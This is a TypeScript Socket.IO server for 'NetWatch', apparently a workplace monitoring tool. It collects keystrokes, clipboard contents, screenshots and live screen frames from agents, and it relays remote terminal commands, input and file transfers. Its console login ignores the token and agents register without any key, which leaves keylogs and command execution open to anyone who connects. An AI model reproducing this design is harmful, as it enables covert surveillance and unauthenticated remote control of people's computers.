import "dotenv/config";
import express from "express";
import { createServer } from "http";
import { Server } from "socket.io";
import cors from "cors";
import { PrismaClient } from "@prisma/client";

const app = express();
const httpServer = createServer(app);
const prisma = new PrismaClient();

const FRONTEND_URL = process.env.FRONTEND_URL || "http://localhost:3000";
const PORT = parseInt(process.env.PORT || "4000", 10);

// CORS configuration
app.use(
  cors({
    origin: [FRONTEND_URL, "http://localhost:3000"],
    credentials: true,
  }),
);

app.use(express.json());

// Health check endpoint
app.get("/health", (req, res) => {
  res.json({ status: "ok", timestamp: new Date().toISOString(), version: "2" });
});

// Socket.IO setup
const io = new Server(httpServer, {
  cors: {
    origin: [FRONTEND_URL, "http://localhost:3000"],
    methods: ["GET", "POST"],
    credentials: true,
  },
  transports: ["websocket", "polling"],
});

// Connected agents and consoles tracking
interface ConnectedAgent {
  socketId: string;
  computerId: string;
  connectedAt: Date;
}

interface ConnectedConsole {
  socketId: string;
  userId: string;
  watchingComputers: Set<string>;
}

const connectedAgents = new Map<string, ConnectedAgent>();
const connectedConsoles = new Map<string, ConnectedConsole>();

// Agent namespace
const agentNamespace = io.of("/agent");
const consoleNamespace = io.of("/console");

// Agent connection handling
agentNamespace.on("connection", (socket) => {
  console.log(`Agent connected: ${socket.id}`);

  // Auth handler - auto-creates computers (used by desktop agents)
  socket.on(
    "auth",
    async (data: {
      machineId: string;
      hostname: string;
      osType: string;
      osVersion: string;
      macAddress: string;
      ipAddress: string;
      agentVersion: string;
    }) => {
      try {
        console.log(
          `Agent auth attempt: ${data.hostname} (${data.macAddress})`,
        );

        // Find or create computer record
        let computer = await prisma.computer.findFirst({
          where: {
            OR: [{ macAddress: data.macAddress }, { hostname: data.hostname }],
          },
        });

        if (!computer) {
          // Auto-register new computer
          const org = await prisma.organization.findFirst();
          if (!org) {
            console.error("No organization found - agent cannot register");
            socket.emit("auth_error", { message: "No organization found" });
            return;
          }

          computer = await prisma.computer.create({
            data: {
              name: data.hostname,
              hostname: data.hostname,
              macAddress: data.macAddress,
              ipAddress: data.ipAddress,
              osType: data.osType,
              osVersion: data.osVersion,
              agentVersion: data.agentVersion,
              status: "ONLINE",
              lastSeen: new Date(),
              organizationId: org.id,
            },
          });
          console.log(
            `New computer created: ${computer.hostname} (${computer.id})`,
          );
        } else {
          // Update existing computer
          computer = await prisma.computer.update({
            where: { id: computer.id },
            data: {
              ipAddress: data.ipAddress,
              osType: data.osType,
              osVersion: data.osVersion,
              agentVersion: data.agentVersion,
              status: "ONLINE",
              lastSeen: new Date(),
            },
          });
          console.log(
            `Existing computer updated: ${computer.hostname} (${computer.id})`,
          );
        }

        // Store connection
        connectedAgents.set(computer.id, {
          socketId: socket.id,
          computerId: computer.id,
          connectedAt: new Date(),
        });

        socket.data = { computerId: computer.id };
        socket.join(`agent:${computer.id}`);

        socket.emit("auth_success", {
          computerId: computer.id,
          config: {
            screenshotInterval: 5000,
            activityLogInterval: 10000,
            keystrokeBufferSize: 100,
          },
        });

        // Notify consoles
        consoleNamespace.emit("agent_online", {
          computerId: computer.id,
          hostname: data.hostname,
        });

        console.log(
          `Agent authenticated: ${computer.hostname} (${computer.id})`,
        );

        // Check for pending commands
        const pendingCommands = await prisma.deviceCommand.findMany({
          where: {
            computerId: computer.id,
            status: "PENDING",
          },
          orderBy: { createdAt: "asc" },
        });

        for (const cmd of pendingCommands) {
          socket.emit("command", {
            id: cmd.id,
            command: cmd.command,
            payload: cmd.payload ? JSON.parse(cmd.payload) : null,
          });

          await prisma.deviceCommand.update({
            where: { id: cmd.id },
            data: { status: "SENT", sentAt: new Date() },
          });
        }
      } catch (error) {
        console.error("Agent auth error:", error);
        socket.emit("auth_error", { message: "Authentication failed" });
      }
    },
  );

  // Legacy register handler (for backwards compatibility)
  socket.on(
    "register",
    async (data: { computerId: string; apiKey?: string }) => {
      const { computerId } = data;

      try {
        // Update computer status to online
        await prisma.computer.update({
          where: { id: computerId },
          data: {
            status: "ONLINE",
            lastSeen: new Date(),
          },
        });

        connectedAgents.set(computerId, {
          socketId: socket.id,
          computerId,
          connectedAt: new Date(),
        });

        socket.data = { computerId };
        socket.join(`agent:${computerId}`);
        socket.emit("registered", { success: true });

        // Notify consoles
        consoleNamespace.emit("agent_online", { computerId });

        console.log(`Agent registered (legacy): ${computerId}`);
      } catch (error) {
        console.error("Agent registration error:", error);
        socket.emit("registered", {
          success: false,
          error: "Registration failed",
        });
      }
    },
  );

  // Heartbeat handler
  socket.on(
    "heartbeat",
    async (data: {
      cpuUsage: number;
      memoryUsage: number;
      diskUsage: number;
      activeWindow?: string;
      activeProcess?: string;
      isIdle: boolean;
      idleTime: number;
    }) => {
      const computerId = socket.data?.computerId;
      if (!computerId) return;

      try {
        await prisma.computer.update({
          where: { id: computerId },
          data: {
            lastSeen: new Date(),
            cpuUsage: data.cpuUsage,
            memoryUsage: data.memoryUsage,
            diskUsage: data.diskUsage,
            status: "ONLINE",
          },
        });

        // Broadcast to watching consoles
        consoleNamespace.to(`watching:${computerId}`).emit("heartbeat", {
          computerId,
          ...data,
        });
      } catch (error) {
        console.error("Error updating heartbeat:", error);
      }
    },
  );

  // Handle screen frame from agent
  socket.on(
    "screen_frame",
    (data: { computerId: string; frame: string; timestamp: number }) => {
      const computerId = socket.data?.computerId || data.computerId;
      consoleNamespace
        .to(`watching:${computerId}`)
        .emit("screen_frame", { ...data, computerId });
    },
  );

  // Handle activity data from agent
  socket.on(
    "activity",
    async (data: {
      computerId: string;
      type: string;
      applicationName: string;
      windowTitle: string;
      duration: number;
      category?: string;
    }) => {
      try {
        await prisma.activityLog.create({
          data: {
            computerId: data.computerId,
            type: data.type,
            applicationName: data.applicationName,
            windowTitle: data.windowTitle,
            duration: data.duration,
            category: data.category,
            startTime: new Date(),
          },
        });

        // Notify watching consoles
        consoleNamespace
          .to(`watching:${data.computerId}`)
          .emit("activity", data);
      } catch (error) {
        console.error("Error saving activity:", error);
      }
    },
  );

  // Handle keystrokes from agent
  socket.on(
    "keystrokes",
    async (data: {
      computerId: string;
      strokes: Array<{
        keys: string;
        applicationName: string;
        windowTitle: string;
        timestamp: number;
      }>;
    }) => {
      const { computerId } = data;

      try {
        for (const stroke of data.strokes) {
          await prisma.keylog.create({
            data: {
              computerId,
              keystrokes: stroke.keys,
              application: stroke.applicationName,
              windowTitle: stroke.windowTitle,
              capturedAt: new Date(stroke.timestamp),
            },
          });
        }

        // Notify watching consoles
        consoleNamespace.to(`watching:${computerId}`).emit("keystrokes", data);
      } catch (error) {
        console.error("Error saving keystrokes:", error);
      }
    },
  );

  // Handle screenshot from agent
  socket.on(
    "screenshot",
    async (data: {
      computerId: string;
      imageData: string;
      activeWindow?: string;
    }) => {
      try {
        const screenshot = await prisma.screenshot.create({
          data: {
            computerId: data.computerId,
            imageUrl: data.imageData, // Base64 or URL
            activeWindow: data.activeWindow,
          },
        });

        consoleNamespace.to(`watching:${data.computerId}`).emit("screenshot", {
          ...data,
          id: screenshot.id,
        });
      } catch (error) {
        console.error("Error saving screenshot:", error);
      }
    },
  );

  // Handle clipboard data from agent
  socket.on(
    "clipboard",
    async (data: {
      computerId: string;
      content: string;
      contentType: string;
    }) => {
      try {
        await prisma.clipboardLog.create({
          data: {
            computerId: data.computerId,
            content: data.content,
            contentType: data.contentType || "TEXT",
          },
        });

        consoleNamespace
          .to(`watching:${data.computerId}`)
          .emit("clipboard", data);
      } catch (error) {
        console.error("Error saving clipboard:", error);
      }
    },
  );

  // Handle process list from agent
  socket.on(
    "processes",
    async (data: {
      computerId: string;
      processes: Array<{
        name: string;
        pid: number;
        cpu: number;
        memory: number;
      }>;
    }) => {
      consoleNamespace
        .to(`watching:${data.computerId}`)
        .emit("processes", data);
    },
  );

  // Handle system info from agent
  socket.on(
    "system_info",
    async (data: {
      computerId: string;
      cpuUsage: number;
      memoryUsage: number;
      diskUsage: number;
    }) => {
      try {
        await prisma.computer.update({
          where: { id: data.computerId },
          data: {
            cpuUsage: data.cpuUsage,
            memoryUsage: data.memoryUsage,
            diskUsage: data.diskUsage,
            lastSeen: new Date(),
          },
        });

        consoleNamespace
          .to(`watching:${data.computerId}`)
          .emit("system_info", data);
      } catch (error) {
        console.error("Error updating system info:", error);
      }
    },
  );

  // Handle command result from agent
  socket.on(
    "command_result",
    async (data: {
      commandId: string;
      success: boolean;
      output?: string;
      error?: string;
    }) => {
      try {
        await prisma.deviceCommand.update({
          where: { id: data.commandId },
          data: {
            status: data.success ? "EXECUTED" : "FAILED",
            response: data.output || data.error,
            executedAt: new Date(),
          },
        });

        consoleNamespace.emit("command_result", data);
      } catch (error) {
        console.error("Error updating command result:", error);
      }
    },
  );

  // Handle file transfer progress
  socket.on(
    "file_transfer_progress",
    (data: { transferId: string; progress: number; status: string }) => {
      consoleNamespace.emit("file_transfer_progress", data);
    },
  );

  // Handle disconnect
  socket.on("disconnect", async () => {
    const computerId = socket.data?.computerId;

    if (computerId) {
      connectedAgents.delete(computerId);

      try {
        await prisma.computer.update({
          where: { id: computerId },
          data: {
            status: "OFFLINE",
            lastSeen: new Date(),
          },
        });
      } catch (error) {
        console.error("Error updating computer status:", error);
      }

      consoleNamespace.emit("agent_offline", { computerId });
      console.log(`Agent disconnected: ${computerId}`);
    } else {
      // Fallback: search by socket ID
      for (const [compId, agent] of connectedAgents.entries()) {
        if (agent.socketId === socket.id) {
          connectedAgents.delete(compId);
          try {
            await prisma.computer.update({
              where: { id: compId },
              data: { status: "OFFLINE", lastSeen: new Date() },
            });
          } catch (e) {
            /* ignore */
          }
          consoleNamespace.emit("agent_offline", { computerId: compId });
          console.log(`Agent disconnected (fallback): ${compId}`);
          break;
        }
      }
    }
  });
});

// Console (dashboard) connection handling
consoleNamespace.on("connection", (socket) => {
  console.log(`Console connected: ${socket.id}`);

  socket.on("authenticate", (data: { userId: string; token?: string }) => {
    connectedConsoles.set(socket.id, {
      socketId: socket.id,
      userId: data.userId,
      watchingComputers: new Set(),
    });

    // Send list of online agents
    const onlineAgents = Array.from(connectedAgents.keys());
    socket.emit("auth_success", { onlineAgents });
  });

  // Start watching a computer
  socket.on("watch_computer", (data: { computerId: string }) => {
    const client = connectedConsoles.get(socket.id);
    if (client) {
      client.watchingComputers.add(data.computerId);
      socket.join(`watching:${data.computerId}`);

      // Request screen stream from agent
      const agent = connectedAgents.get(data.computerId);
      if (agent) {
        agentNamespace.to(agent.socketId).emit("start_screen_stream", {
          quality: 60,
          fps: 5,
        });
      }
    }
  });

  // Stop watching a computer
  socket.on("unwatch_computer", (data: { computerId: string }) => {
    const client = connectedConsoles.get(socket.id);
    if (client) {
      client.watchingComputers.delete(data.computerId);
      socket.leave(`watching:${data.computerId}`);

      // Check if anyone else is watching
      const watchersRoom = consoleNamespace.adapter.rooms.get(
        `watching:${data.computerId}`,
      );
      if (!watchersRoom || watchersRoom.size === 0) {
        const agent = connectedAgents.get(data.computerId);
        if (agent) {
          agentNamespace.to(agent.socketId).emit("stop_screen_stream");
        }
      }
    }
  });

  // Send command to agent
  socket.on(
    "send_command",
    async (data: {
      computerId: string;
      command: string;
      payload?: Record<string, unknown>;
    }) => {
      const agent = connectedAgents.get(data.computerId);
      if (agent) {
        try {
          const cmd = await prisma.deviceCommand.create({
            data: {
              computerId: data.computerId,
              command: data.command,
              payload: JSON.stringify(data.payload || {}),
              status: "PENDING",
            },
          });

          agentNamespace.to(agent.socketId).emit("command", {
            commandId: cmd.id,
            command: data.command,
            payload: data.payload,
          });

          socket.emit("command_sent", { commandId: cmd.id });
        } catch (error) {
          console.error("Error sending command:", error);
          socket.emit("command_error", { error: "Failed to send command" });
        }
      } else {
        socket.emit("command_error", { error: "Agent not online" });
      }
    },
  );

  // Remote control - mouse/keyboard input
  socket.on(
    "remote_input",
    (data: {
      computerId: string;
      type: "mouse" | "keyboard";
      event: Record<string, unknown>;
    }) => {
      const agent = connectedAgents.get(data.computerId);
      if (agent) {
        agentNamespace.to(agent.socketId).emit("remote_input", data);
      }
    },
  );

  // Terminal command
  socket.on(
    "terminal_command",
    (data: { computerId: string; command: string; sessionId: string }) => {
      const agent = connectedAgents.get(data.computerId);
      if (agent) {
        agentNamespace.to(agent.socketId).emit("terminal_command", data);
      }
    },
  );

  // File transfer request
  socket.on(
    "file_transfer",
    async (data: {
      computerId: string;
      direction: "UPLOAD" | "DOWNLOAD";
      remotePath: string;
      localPath?: string;
      fileData?: string;
    }) => {
      const agent = connectedAgents.get(data.computerId);
      if (agent) {
        try {
          const transfer = await prisma.fileTransfer.create({
            data: {
              computerId: data.computerId,
              fileName: data.remotePath.split("/").pop() || "unknown",
              remotePath: data.remotePath,
              localPath: data.localPath || data.remotePath,
              direction: data.direction,
              status: "IN_PROGRESS",
            },
          });

          agentNamespace.to(agent.socketId).emit("file_transfer", {
            transferId: transfer.id,
            ...data,
          });

          socket.emit("file_transfer_started", { transferId: transfer.id });
        } catch (error) {
          console.error("Error creating file transfer:", error);
          socket.emit("file_transfer_error", {
            error: "Failed to initiate transfer",
          });
        }
      }
    },
  );

  // Send message to computer
  socket.on(
    "send_message",
    async (data: {
      computerId: string;
      message: string;
      type: "INFO" | "WARNING" | "URGENT";
      lockScreen?: boolean;
    }) => {
      const agent = connectedAgents.get(data.computerId);
      if (agent) {
        agentNamespace.to(agent.socketId).emit("display_message", data);
        socket.emit("message_sent", { success: true });
      }
    },
  );

  // Handle disconnect
  socket.on("disconnect", () => {
    const client = connectedConsoles.get(socket.id);
    if (client) {
      // Stop watching all computers
      for (const computerId of client.watchingComputers) {
        const watchersRoom = consoleNamespace.adapter.rooms.get(
          `watching:${computerId}`,
        );
        if (!watchersRoom || watchersRoom.size <= 1) {
          const agent = connectedAgents.get(computerId);
          if (agent) {
            agentNamespace.to(agent.socketId).emit("stop_screen_stream");
          }
        }
      }
      connectedConsoles.delete(socket.id);
    }
    console.log(`Console disconnected: ${socket.id}`);
  });
});

// Start server
httpServer.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════════════════════╗
║         NetWatch Socket.io Server Started             ║
╠═══════════════════════════════════════════════════════╣
║  Port:     ${PORT.toString().padEnd(42)}║
║  Frontend: ${FRONTEND_URL.padEnd(42)}║
║  Agent:    ws://localhost:${PORT}/agent${" ".repeat(22)}║
║  Console:  ws://localhost:${PORT}/console${" ".repeat(20)}║
╚═══════════════════════════════════════════════════════╝
  `);
});

// Graceful shutdown
process.on("SIGTERM", async () => {
  console.log("SIGTERM received, shutting down...");
  await prisma.$disconnect();
  httpServer.close(() => {
    process.exit(0);
  });
});
